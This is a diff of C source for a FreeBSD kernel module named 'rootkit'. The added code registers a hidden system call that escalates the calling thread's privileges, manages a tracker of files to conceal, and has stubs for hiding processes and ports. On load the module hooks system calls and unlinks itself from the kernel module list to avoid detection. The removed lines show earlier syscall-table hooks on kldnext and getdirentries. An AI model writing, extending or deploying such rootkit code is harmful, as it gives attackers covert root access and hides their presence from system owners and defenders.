@@ -1,73 +1,93 @@
-#include <sys/types.h>
-#include <sys/param.h>
-#include <sys/proc.h>
-#include <sys/module.h>
-#include <sys/sysent.h>
-#include <sys/kernel.h>
-#include <sys/systm.h>
-#include <sys/sysproto.h>
-#include <sys/syscall.h>
-#include <sys/param.h>
-#include <sys/linker.h>
-
-#include <sys/proc.h>
-#include <sys/resourcevar.h>
-#include <sys/mutex.h>
-#include <sys/lock.h>
-#include <sys/sx.h>
-
 #include "rootkit.h"
+
+struct node * first_node = NULL;
 
 /* The system call's arguments. */
 struct rootkit_args {
+	int command;
+	char ** args;
 };
 
+/* The offset in sysent[] where the system call is to be allocated. */
+static int offset = NO_SYSCALL;
+
 /* The system call function. */
-static int rootkit_func(struct thread *td, void *syscall_args) {
+static int main(struct thread *td, void *syscall_args) {
+
 	struct rootkit_args *uap;
 	uap = (struct rootkit_args *)syscall_args;
 
-	elevate(td);
+	long resp;
+
+	switch(uap->command){
+		case 0:// Unload
+			break;
+		case 1:// Escalate
+			uprintf("DOING\n");
+			elevate(td);
+			break;
+		case 2:// Add file to tracker
+			add_file(uap->args[0]);
+			break;
+		case 3:// Remove file from tracker
+			remove_file(uap->args[0]);
+			break;
+		case 4:// Set tracker flags
+			resp = strtol(uap->args[1], NULL, 16);
+			set_flag_bits(uap->args[0], (uint8_t)resp);
+			break;
+		case 5:// Unset tracker flags
+			resp = strtol(uap->args[1], NULL, 16);
+			unset_flag_bits(uap->args[0], (uint8_t)resp);
+			break;
+		case 6://Hide process
+			break;
+		case 7://Unhide process
+			break;
+		case 8://Hide port
+			break;
+		case 9://Unhide port
+			break;
+		default:
+			break;
+	}
 
 	return(0);
 }
 
 /* The sysent for the new system call. */
 static struct sysent rootkit_sysent = {
-	0,			/* number of arguments */
-	rootkit_func		/* implementing function */
+	2,			/* number of arguments */
+	main		/* implementing function */
 };
-
-/* The offset in sysent[] where the system call is to be allocated. */
-static int offset = NO_SYSCALL;
 
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
 	int error = 0;
 
 	switch (cmd) {
-	case MOD_LOAD:
-		printf("system call loaded at offset %d.\n", offset);
-		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
-		printf("kldnext hooked\n");
-		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
-		printf("getdirentries hooked\n");
+		case MOD_LOAD:
+			insert_hooks();
 
-		
-		
-		break;
+			mod_unlink(module, cmd, arg);
 
-	case MOD_UNLOAD:
-		printf("system call unloaded from offset %d.\n", offset);
-		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
-		printf("kldnext unhooked\n");
-		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-		printf("getdirentries unhooked\n");
-		break;
+			int testfd = 0;
 
-	default:
-		error = EOPNOTSUPP;
-		break;
+			char buf[256] = {0};
+			snprintf(buf, 256, "%d", offset);
+
+			filewriter_openlog(curthread, &testfd, LOGFILE);
+			filewriter_writelog(curthread, testfd, buf, strlen(buf));
+			filewriter_closelog(curthread, testfd);
+
+			break;
+
+		case MOD_UNLOAD:
+			remove_hooks();
+			break;
+		default:
+			error = EOPNOTSUPP;
+			break;
 	}
 
 	return(error);
@@ -84,3 +104,4 @@ static moduledata_t rootkit_mod = {
 };
 
 DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
